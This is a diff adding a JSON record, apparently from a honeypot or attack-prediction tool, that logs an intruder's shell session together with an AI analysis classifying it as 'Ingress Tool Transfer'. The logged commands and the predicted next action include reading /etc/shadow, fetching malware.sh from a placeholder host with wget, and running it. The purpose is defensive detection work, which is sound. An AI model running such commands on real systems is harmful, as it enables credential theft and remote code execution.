@@ -1,0 +1,34 @@
+{
+  "session_id": "9530b0da43ec",
+  "src_ip": "172.17.0.1",
+  "commands": [
+    "whoami",
+    "id",
+    "uname -a",
+    "cat /etc/passwd",
+    "ls -la",
+    "pwd",
+    "ifconfig",
+    "ps aux",
+    "cat /etc/shadow",
+    "wget http://example.com/malware.sh",
+    "exit"
+  ],
+  "raw_ai_response": "{\"prediction_available\":true,\"risk_level\":\"High\",\"current_stage\":\"Ingress Tool Transfer\",\"predicted_next_action\":\"Execute the downloaded malware (e.g., chmod +x malware.sh && ./malware.sh)\",\"confidence\":85,\"reasoning\":[\"Attacker performed system identification (whoami, id, uname -a)\",\"Collected files and network info (cat /etc/passwd, cat /etc/shadow, ifconfig, ps aux)\",\"Downloaded a script from external server using wget\",\"Downloading a payload indicates transition to Ingress Tool Transfer stage\",\"Credential files accessed show credential access intent\",\"The most advanced observed behavior is the transfer of a malicious script\"],\"prediction_note\":\"After downloading a payload, attackers typically attempt to execute it to gain code execution or establish persistence.\"}",
+  "parsed_analysis": {
+    "prediction_available": true,
+    "risk_level": "High",
+    "current_stage": "Ingress Tool Transfer",
+    "predicted_next_action": "Execute the downloaded malware (e.g., chmod +x malware.sh && ./malware.sh)",
+    "confidence": 85,
+    "reasoning": [
+      "Attacker performed system identification (whoami, id, uname -a)",
+      "Collected files and network info (cat /etc/passwd, cat /etc/shadow, ifconfig, ps aux)",
+      "Downloaded a script from external server using wget",
+      "Downloading a payload indicates transition to Ingress Tool Transfer stage",
+      "Credential files accessed show credential access intent",
+      "The most advanced observed behavior is the transfer of a malicious script"
+    ],
+    "prediction_note": "After downloading a payload, attackers typically attempt to execute it to gain code execution or establish persistence."
+  }
+}
